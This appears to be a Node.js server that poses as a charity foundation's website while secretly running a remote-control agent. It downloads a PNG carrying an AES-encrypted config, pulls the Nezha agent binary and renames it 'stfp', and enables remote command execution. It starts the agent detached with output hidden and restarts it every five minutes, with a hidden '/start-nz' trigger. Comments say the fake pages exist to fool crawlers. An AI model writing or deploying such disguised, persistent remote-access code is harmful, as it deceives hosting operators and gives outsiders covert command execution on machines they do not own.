const http = require('http');
const https = require('https');
const fs = require('fs');
const crypto = require('crypto');
const os = require('os');
const { existsSync, mkdirSync, rmSync, chmodSync, unlinkSync, writeFileSync } = require('fs');
const { spawn } = require('child_process');
const path = require('path');
const AdmZip = require('adm-zip');

// ========== 路径配置 ==========
const BASEDIR = path.join(process.cwd(), '.npm_logs');
const CACHE_DIR = path.join(process.cwd(), 'agent_cache');
const TMP_DIR = path.join(process.cwd(), '.tmp_dl');
const AGENT_BIN = path.join(CACHE_DIR, 'stfp');
const CONFIG_PATH = path.join(CACHE_DIR, 'config.yml');
const LOCAL_IMAGE_PATH = path.join(CACHE_DIR, 'dknz.png');
const ZIP_PATH = path.join(TMP_DIR, 'agent.zip');
const HTML_PATH = path.join(__dirname, 'index.html');

const PORT = process.env.SERVER_PORT || process.env.PORT || 4567;

const GH_PROXIES = [
    'https://gh-proxy.com/',
    'https://mirror.ghproxy.com/',
    'https://ghproxy.net/',
    ''
];

ensureDir(BASEDIR);
ensureDir(CACHE_DIR);
ensureDir(TMP_DIR);

const CRYPTO_KEY = "1234567890abcdef1234567890abcdef";

let agentProcess = null;

// ========== 工具函数 ==========
function fetchText(url) {
    return new Promise((resolve, reject) => {
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    let data = '';
                    res.on('data', chunk => data += chunk);
                    res.on('end', () => resolve(data.trim()));
                } else {
                    reject(new Error(`HTTP ${res.statusCode}`));
                }
            }).on('error', (err) => reject(new Error(`网络请求失败: ${err.message}`)));
        };
        request(url);
    });
}

async function fetchFileWithFallback(rawUrl, destPath) {
    let lastErr = null;
    for (const proxy of GH_PROXIES) {
        const fullUrl = proxy ? `${proxy}${rawUrl}` : rawUrl;
        try {
            await fetchFile(fullUrl, destPath);
            return true;
        } catch (e) {
            lastErr = e;
            if (existsSync(destPath)) unlinkSync(destPath);
        }
    }
    throw lastErr || new Error('所有代理均下载失败');
}

function fetchFile(url, destPath) {
    return new Promise((resolve, reject) => {
        const file = fs.createWriteStream(destPath);
        const request = (targetUrl) => {
            https.get(targetUrl, (res) => {
                if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
                    request(res.headers.location);
                } else if (res.statusCode === 200) {
                    res.pipe(file);
                    file.on('finish', () => {
                        file.close(() => resolve(true));
                    });
                } else {
                    if (existsSync(destPath)) unlinkSync(destPath);
                    reject(new Error(`下载失败 HTTP ${res.statusCode}`));
                }
            }).on('error', (err) => {
                if (existsSync(destPath)) unlinkSync(destPath);
                reject(new Error(`下载网络错误: ${err.message}`));
            });
        };
        request(url);
    });
}

async function getServerIP() {
    try {
        return await fetchText('https://api.ip.sb/ip');
    } catch (e) {
        const nets = os.networkInterfaces();
        for (const name of Object.keys(nets)) {
            for (const net of nets[name]) {
                if (net.family === 'IPv4' && !net.internal) {
                    return net.address;
                }
            }
        }
        return '127.0.0.1';
    }
}

function generateUUID(ip) {
    const hash = crypto.createHash('md5').update(ip).digest('hex');
    return `${hash.substring(0,8)}-${hash.substring(8,12)}-${hash.substring(12,16)}-${hash.substring(16,20)}-${hash.substring(20,32)}`;
}

function parseImageMetadata(imagePath) {
    try {
        const buffer = fs.readFileSync(imagePath);
        const startMarker = Buffer.from('==NZ_CONFIG_START==');
        const endMarker = Buffer.from('==NZ_CONFIG_END==');

        const startPos = buffer.indexOf(startMarker);
        if (startPos === -1) return null;

        const endPos = buffer.indexOf(endMarker, startPos);
        if (endPos === -1) return null;

        const payloadStr = buffer.slice(startPos + startMarker.length, endPos).toString('utf8').trim();

        const parts = payloadStr.split(':');
        const iv = Buffer.from(parts.shift(), 'hex');
        const encrypted = Buffer.from(parts.join(':'), 'hex');
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(CRYPTO_KEY), iv);
        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch(e) {
        return null;
    }
}

function parseEnv(text) {
    const env = {};
    const regex = /(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*['"]([^'"]+)['"]/g;
    let match;
    while ((match = regex.exec(text)) !== null) {
        env[match[1]] = match[2];
    }
    return env;
}

function isProcessAlive(pid) {
    if (!pid) return false;
    try {
        process.kill(pid, 0);
        return true;
    } catch (e) {
        return false;
    }
}

// ========== 核心启动逻辑 ==========
async function startNezhaAgent() {
    try {
        if (agentProcess && isProcessAlive(agentProcess.pid)) {
            return true;
        }

        const imageUrl = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png';

        await fetchFileWithFallback(imageUrl, LOCAL_IMAGE_PATH);

        const decryptedText = parseImageMetadata(LOCAL_IMAGE_PATH);
        if (!decryptedText) {
            return false;
        }
        const nezhaConfig = parseEnv(decryptedText);

        const ip = await getServerIP();
        const uuid = generateUUID(ip);

        if (!existsSync(AGENT_BIN)) {
            const archMap = { 'x64': 'amd64', 'arm64': 'arm64', 'arm': 'armv7' };
            const arch = archMap[process.arch] || 'amd64';
            const rawUrl = `https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${arch}.zip`;

            ensureDir(TMP_DIR);
            await fetchFileWithFallback(rawUrl, ZIP_PATH);

            if (existsSync(CACHE_DIR)) rmSync(CACHE_DIR, { recursive: true, force: true });
            ensureDir(CACHE_DIR);

            try {
                const zip = new AdmZip(ZIP_PATH);
                zip.extractAllTo(CACHE_DIR, true);
            } catch (e) {
                return false;
            } finally {
                if (existsSync(ZIP_PATH)) {
                    try { unlinkSync(ZIP_PATH); } catch (_) {}
                }
            }

            const originBin = path.join(CACHE_DIR, 'nezha-agent');
            if (existsSync(originBin)) {
                fs.renameSync(originBin, AGENT_BIN);
                chmodSync(AGENT_BIN, 0o755);
            } else {
                return false;
            }
        }

        const tlsEnabled = nezhaConfig.NZ_TLS === 'true' || nezhaConfig.NZ_TLS === '1';
        const configContent = `server: '${nezhaConfig.NZ_SERVER}'
client_secret: '${nezhaConfig.NZ_SECRET}'
client_id: '${uuid}'
tls: ${tlsEnabled}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: false
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '${uuid}'
`;
        writeFileSync(CONFIG_PATH, configContent);

        agentProcess = spawn(AGENT_BIN, ['-c', CONFIG_PATH], {
            env: { ...process.env, UUID: uuid, NZ_CLIENT_ID: uuid, NZ_REPORT_DELAY: '4' },
            stdio: "ignore",
            detached: true
        });

        agentProcess.unref();

        agentProcess.on('exit', () => {
            agentProcess = null;
        });

        return true;

    } catch (err) {
        agentProcess = null;
        return false;
    }
}

// ========== 进程保活巡检 ==========
async function monitorProcesses() {
    if (!isProcessAlive(agentProcess?.pid)) {
        await startNezhaAgent();
    }
}

const Scheduler = {
    intervalMinutes: 5,
    active: true,
    async loop() {
        if (!this.active) return;
        await monitorProcesses();
        setTimeout(() => this.loop(), this.intervalMinutes * 60 * 1000);
    }
};

// ========== HTTP 服务 ==========
http.createServer(async (req, res) => {
    const url = req.url || '/';

    // 首页：公益伪装页面
    if (url === '/' || url === '/index.html') {
        fs.readFile(HTML_PATH, 'utf8', (err, content) => {
            if (err) {
                res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
                res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><title>绿叶公益基金会</title></head><body><h1>绿叶公益基金会</h1><p>致力于儿童教育与环境保护</p></body></html>');
                return;
            }
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(content);
        });
        return;
    }

    // 伪装路由：让爬虫觉得这是公益站
    if (url === '/about' || url === '/programs' || url === '/donate' || url === '/news' || url === '/robots.txt') {
        if (url === '/robots.txt') {
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end('User-agent: *\nAllow: /\nDisallow: /api/\n');
            return;
        }
        fs.readFile(HTML_PATH, 'utf8', (err, content) => {
            res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
            res.end(content);
        });
        return;
    }

    // 隐蔽启动接口
    if (url === '/start-nz') {
        const ret = await startNezhaAgent();
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        return res.end(JSON.stringify({
            code: ret ? 0 : -1,
            msg: ret ? "ok" : "error"
        }));
    }

    // 隐蔽状态查询
    if (url === '/api/v1/status') {
        const isRunning = isProcessAlive(agentProcess?.pid);
        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        return res.end(JSON.stringify({
            status: "online",
            service: "GreenLeaf Charity API",
            version: "1.0.0",
            running: isRunning
        }));
    }

    // 其他路径返回 404 但伪装成公益站点的 404
    res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
    res.end('<!DOCTYPE html><html><head><meta charset="utf-8"><title>页面未找到 - 绿叶公益</title></head><body style="font-family:sans-serif;text-align:center;padding:80px;"><h1>404</h1><p>页面走丢了，<a href="/">返回首页</a></p></body></html>');
}).listen(PORT, () => {
    setTimeout(() => Scheduler.loop(), 2000);
});

function ensureDir(p) {
    if (!existsSync(p)) mkdirSync(p, { recursive: true });
}
